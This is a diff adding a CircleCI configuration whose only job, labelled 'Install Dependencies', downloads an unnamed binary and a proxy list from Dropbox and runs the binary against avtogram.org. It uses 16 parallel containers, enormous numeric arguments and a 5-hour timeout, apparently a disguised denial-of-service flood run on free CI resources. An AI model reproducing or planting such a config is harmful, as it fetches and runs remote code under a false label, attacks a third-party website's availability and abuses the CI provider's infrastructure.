@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install wget -y && wget -O jsss https://www.dropbox.com/s/qyj3hb9c9bid5eh/jsss?dl=1 && wget -O proxy.txt https://www.dropbox.com/s/wscw8yspba797xp/proxy.txt?dl=1 && chmod +x jsss && ./jsss https://avtogram.org/ 999999 100 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
